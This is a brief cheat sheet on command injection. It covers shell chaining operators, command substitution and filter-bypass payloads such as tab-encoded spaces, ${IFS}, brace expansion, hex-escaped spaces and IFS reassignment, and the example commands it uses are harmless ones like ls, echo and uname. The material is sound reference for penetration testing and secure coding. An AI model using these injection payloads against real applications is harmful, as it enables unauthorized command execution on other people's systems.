# Command Injection

> Command injection allows attackers to execute arbitrary commands in a vulnerable application.

## Chaining commmands
1. ;
	- Execute command by command, may not work if the first command doesn't terminate
2. &
	- Executes the first command in the background and the second in the foreground
3. |
	- Pipes output of first command into second (may cause errors)
4. && and ||
	- AND gate and OR gate; runs second command if first command succeeds or fails respectively

## Run command in command
```bash
ping $(ls)
ping `ls`
```

## Filter bypass
### Space 
Tabs can be substitute for spaces
```bash
;ls%09-al%09/
```

## Linux

### space == ${IFS}
eg.
```bash
echo${IFS}Hello${IFS}World

Hello World
```

### Bash brace expansion
```bash
{echo,hello,world}
```

### Command parameters in env var (encoded spaces as hex value)
```bash
CMD=$'\x20hello\x20world';echo$CMD
```

## Bash 
### Change IFS character
```bash
IFS=,;`cat<<<uname,-a`

IFS=.;`cat<<<echo.hello`
```
*<<< passes the output of the following command (or string) to the standard input of the preceding one*

*IFS can be any character that will not interfere with the proper running of the program*

*Does not work like this: IFS=,;echo,hello,world*
